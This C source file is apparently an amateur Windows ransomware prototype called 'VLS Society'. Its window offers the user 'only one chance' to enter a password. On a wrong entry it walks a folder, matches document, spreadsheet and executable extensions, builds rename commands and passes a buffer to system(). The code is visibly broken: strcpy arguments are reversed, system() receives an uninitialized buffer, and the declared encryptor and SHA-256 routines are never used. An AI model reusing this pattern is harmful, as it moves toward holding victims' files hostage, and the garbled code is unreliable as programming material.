#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <conio.h>
#include <time.h>
#include <dirent.h>
#include <memory.h>
#define ROTLEFT(a,b) (((a) << (b)) | ((a) >> (32-(b))))
#define ROTRIGHT(a,b) (((a) >> (b)) | ((a) << (32-(b))))
#define CH(x,y,z) (((x) & (y)) ^ (~(x) & (z)))
#define MAJ(x,y,z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define EP0(x) (ROTRIGHT(x,2) ^ ROTRIGHT(x,13) ^ ROTRIGHT(x,22))
#define EP1(x) (ROTRIGHT(x,6) ^ ROTRIGHT(x,11) ^ ROTRIGHT(x,25))
#define SIG0(x) (ROTRIGHT(x,7) ^ ROTRIGHT(x,18) ^ ((x) >> 3))
#define SIG1(x) (ROTRIGHT(x,17) ^ ROTRIGHT(x,19) ^ ((x) >> 10))

void encryptor(char file[100]);
void * entryFolder(char entryWithPathName[50] );
HWND textFiled; // Text message
HWND textBox; // Field text
int gwtstat = 0;
char tryDesencrypt[100];
stringParaInt(char *string);
int hash(int valor);

const char g_szClassName[] = "myWindowClass";

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch(msg)
    {
        case WM_CREATE:
            textFiled = CreateWindow(
                    "STATIC",
                    "  Voce tem uma unica chance, pense bem antes de usar",
                    WS_VISIBLE | WS_CHILD | WS_BORDER,
                    25, 25, 350, 35,
                    hwnd, NULL, NULL, NULL
                    );
            textBox = CreateWindow(
                    "EDIT", "",
                    WS_BORDER | WS_CHILD | WS_VISIBLE,
                    40, 80, 200, 30,
                    hwnd, NULL, NULL, NULL
                    );
            CreateWindow(
                    "BUTTON", "ENVIAR",
                    WS_BORDER | WS_CHILD | WS_VISIBLE,
                    220, 80, 120, 30,
                    hwnd, 1, NULL, NULL
            );
            break;
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case 1:
                    gwtstat = 0;
                    gwtstat = GetWindowText(textBox, &tryDesencrypt[0], 100);
                    if( strcmp(tryDesencrypt, "SHA-256 for desencrypt") <= 0) {
                        MessageBox(hwnd, "Nice, congratulations", tryDesencrypt, MB_OK);
                    }
                    else{
                        entryFolder("C:\\Users\\Public\\Documents\\testederemocao");
                    }

                    MessageBox(hwnd, tryDesencrypt, tryDesencrypt, MB_OK);
                    break;

            }
            break;
        case WM_CLOSE:
            DestroyWindow(hwnd);
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{

    WNDCLASSEX wc;
    HWND hwnd;
    MSG Msg;

    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = hInstance;
    wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

    if(!RegisterClassEx(&wc))
    {
        MessageBox(NULL, "Falha no registro!", "Erro!",
                   MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    hwnd = CreateWindowEx(
            WS_EX_CLIENTEDGE,
            g_szClassName,
            "VLS Society",
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT, CW_USEDEFAULT, 400, 400,
            NULL, NULL, hInstance, NULL);

        if(hwnd == NULL)
        {
            MessageBox(NULL, "Falha na criação da janela!", "Erro!",
                       MB_ICONEXCLAMATION | MB_OK);
            return 0;
        }

        ShowWindow(hwnd, nCmdShow);
        UpdateWindow(hwnd);

        while(GetMessage(&Msg, NULL, 0, 0) > 0)
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }

    return Msg.wParam;
}

typedef struct extensions{
    char txt[5], exe[5], docx[6], xlsx[6];
    char pptx[6], js[5], py[5], bin[6];
    char dll[6], bat[4];
} extensions;

void banner();

void * entryFolder( char entryWithPathName[50] ){
    DIR *path;
    FILE *ptFile;
    int files = 0;
    path = opendir(entryWithPathName);
    struct dirent *entry;
    if(path == NULL)
    {
        printf("close folder");
    }
    else
    {
        while( (entry=readdir(path)) )
        {

            struct extensions exts;

            strcpy(exts.exe, ".exe"); strcpy(exts.pptx, ".pptx");
            strcpy(exts.txt, ".txt"); strcpy(exts.js, ".js");
            strcpy(exts.docx, ".docx"); strcpy(exts.py, ".py");
            strcpy(exts.xlsx, ".xlsx"); strcpy(exts.bin, ".bin");
            strcpy(exts.dll, ".dll"); strcpy(exts.bat, ".bat");

            files++;
            char renameCommand[50];
            strcpy("Ren ", renameCommand);

            char finnallyCommand[50] = {entry->d_name};
            strcpy(renameCommand, finnallyCommand);

            char totallyFinnally[50];
            strcpy(finnallyCommand, "wdaawdawdawdawdawdaw.txt");


            char *ret;

            ret = strstr(entry->d_name, exts.txt);
            if(ret == NULL){
                ret = strstr(entry->d_name, exts.exe);
            }
            else{

                system(totallyFinnally);
            }


            MessageBox(NULL, entry->d_name, "Pastas", MB_OK);

        }
    }
    closedir(path);
    return 0;
}








